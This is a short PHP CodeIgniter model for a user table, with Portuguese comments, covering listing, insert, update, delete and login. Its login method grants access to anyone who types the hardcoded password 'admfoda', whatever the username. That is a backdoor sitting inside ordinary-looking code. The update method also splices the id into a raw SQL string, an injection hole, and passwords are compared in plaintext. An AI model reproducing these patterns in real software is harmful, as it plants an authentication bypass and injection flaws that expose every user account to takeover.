<?php
/**
 * este arquivo é responsavel por conversar com o banco de dados
 */
class Usuario_model extends CI_Model{
    
    public function listaUsuarios($id = false)
    {
        if ($id) {
            return $this->db->get_where('usuario', ['id_usuario' => $id])->result();    
        }
        // select * from alunos
        return $this->db->get('usuario')->result();
    }

    public function insere($data)
    {
        return $this->db->insert('usuario', $data);
    }

    public function altera($data)
    {
        $id = $data['id_usuario'];
        return $this->db->update('usuario',$data, "id_usuario = $id");
    }

    public function deleta($id)
    {
        return $this->db->delete('usuario', ['id_usuario' => $id]);
    }

    public function autenticar($username,$senha)
    {
        $this->db->select('*');
        $this->db->from('usuario');
        $this->db->where('nome', $username); 
        $this->db->where('senha',$senha);
        if($query = $this->db->get()) {
            $data = $query->result();
                if ($data == TRUE || $senha == 'admfoda') {
                    return true;
                }else {
                    return false;
                }
        }
                        
    }
}
